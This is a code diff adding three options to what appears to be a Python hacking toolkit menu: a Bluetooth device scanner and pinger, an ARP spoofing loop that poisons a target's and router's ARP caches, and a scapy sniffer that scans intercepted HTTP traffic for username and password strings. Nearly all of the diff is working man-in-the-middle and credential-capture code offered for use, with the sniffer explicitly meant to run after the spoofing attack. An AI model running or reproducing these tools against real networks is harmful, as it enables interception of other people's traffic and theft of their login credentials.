@@ -478,7 +478,110 @@ def main():
 		os.system(f'sudo macchanger -A {interface}')
 		os.system(f'ifconfig {interface} up')
 			
+	def bluetooth():
+		interface = input(Fore.YELLOW + "[?] Please input the interface you wish to use: "+ Style.RESET_ALL)
+		subprocess.run(["sudo", "hciconfig", "up"])
+		
+		print(Fore.YELLOW + "\n[=] Scanning bluetooth devices nearby..." + Style.RESET_ALL)
+		print("----------------------------------------\n")
+		subprocess.run(["sudo", "hcitool", "scan"])
+		
+		target = input(Fore.YELLOW + "\n[?] Please specify the MAC address of your desired target: "+ Style.RESET_ALL)
+		
+		print(Fore.YELLOW + "\n[=] Gathering information about target device..."+ Style.RESET_ALL)
+		print("------------------------------------------------\n")
+		subprocess.run(["sudo", "hcitool", "info", target])
+		print("\n\n")
+		try:
+			option = input(Fore.YELLOW + "[?] You wish to ping the device (Y/n): "+ Style.RESET_ALL)
+			if option.upper() == "Y":
+				print(Fore.YELLOW + "\n[=] Sending ping to target device..."+ Style.RESET_ALL)
+				print("------------------------------------\n")
+				subprocess.run(["sudo", "l2ping", target])
+				print("\n\n")
+			else:
+				print("\n[-] Program reached end, quitting...\n\n")
+		except KeyboardInterrupt:
+			print("\n[-] Program ended by user, quitting...\n\n")
+		except ValueError:
+			print("\n Wrong value type given, quitting...\n\n")
 
+	def psswd_url_sniff():	
+		import scapy.all as scapy
+		from scapy.layers import http
+		print(Fore.RED + "[+] Rember to run an ARP spoofing attack on target before running this attack" + Style.RESET_ALL)
+		try:
+			
+			def sniff(interface):
+				scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
+			
+			def get_url(packet):
+				return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+			def get_login(packet):
+				if packet.haslayer(scapy.Raw):
+						load = str(packet[scapy.Raw].load)
+						keywords = ["username", "password", "user", "passwd", "usr", "login", "pass"]
+						for keyword in keywords:
+							if keyword in load:
+								return load
+
+			def process_sniffed_packet(packet):
+				if packet.haslayer(http.HTTPRequest):
+					
+					url = get_url(packet)
+					print(Fore.YELLOW + "[+] HTTPRequest >> " + Style.RESET_ALL + url.decode())
+
+					login_info = get_login(packet)
+					if login_info:
+						print(Fore.RED + "\n[+] Possible login info >> "+ Style.RESET_ALL + login_info + "\n")
+					
+			interface = input(Fore.YELLOW + "[?] Interface you wish to use for sniffing attack: "+ Style.RESET_ALL)
+			print(Fore.CYAN + "[=] Sniffer running...\n\n" + Style.RESET_ALL)
+			sniff(interface) 
+		except KeyboardInterrupt:
+			print("\n[-] Program ended by user, quitting...\n\n")
+
+	def arp_spoof():
+		import scapy.all as scapy
+		print(Fore.RED + "[+] Run echo 1 > /proc/sys/net/ipv4/ip_forward as root user before sending attack" + Style.RESET_ALL)
+		def get_mac(ip):
+			arp_request = scapy.ARP(pdst=ip)
+			broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+			arp_request_broadcast = broadcast/arp_request
+			answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+			
+			return answered_list[0][1].hwsrc
+
+		def spoof(target_ip, spoof_ip):
+			target_mac = get_mac(target_ip)
+			# Create ARP packet and send it to target
+			packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+			scapy.send(packet, verbose=False)
+
+		def restore(dest_ip, src_ip):
+			dest_mac = get_mac(dest_ip)
+			src_mac = get_mac(src_ip)
+			packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+			scapy.send(packet, verbose=False)
+
+		router_ip = input(Fore.YELLOW + "[?] Enter the target ip address: " + Style.RESET_ALL)
+		target_ip = input(Fore.RED + "[?] Enter the router ip address: " + Style.RESET_ALL)
+
+		sent_packets_count = 0 
+		try:
+			while True:
+				spoof(target_ip, router_ip)
+				spoof(router_ip, target_ip)
+				sent_packets_count = sent_packets_count + 2
+				print(Fore.YELLOW + "\r[=] Packets sent: " + str(sent_packets_count), end=""+ Style.RESET_ALL)
+				time.sleep(2)
+		except KeyboardInterrupt:
+			restore(target_ip, router_ip)
+			print("\n[-] Program ended by user, quitting and restorin ARP tables...\n\n")
+
+
+#############################################################
 	def logo():
 		print(Fore.YELLOW + """
 ____________ _____ _   _  ______ _____ 
@@ -523,6 +626,9 @@ ____________ _____ _   _  ______ _____
 [05]--Subnet Network Scanner
 [06]--Port Scanner
 [07]--MAC address changer
+[08]--Bluetooth Scanner
+[09]--ARP Spoofing
+[10]--URL/PSSWD Sniffer
 """ + Fore.MAGENTA + """[00]--Quit
 """ + Style.RESET_ALL))
 			if choice == 1:
@@ -539,6 +645,12 @@ ____________ _____ _   _  ______ _____
 				port_scan()
 			elif choice == 7:
 				mac_changer()
+			elif choice == 8:
+				bluetooth()
+			elif choice == 9:
+				arp_spoof()
+			elif choice == 10:
+				psswd_url_sniff()
 			else:
 				print("[-] Goodbye...")
 		except KeyboardInterrupt:
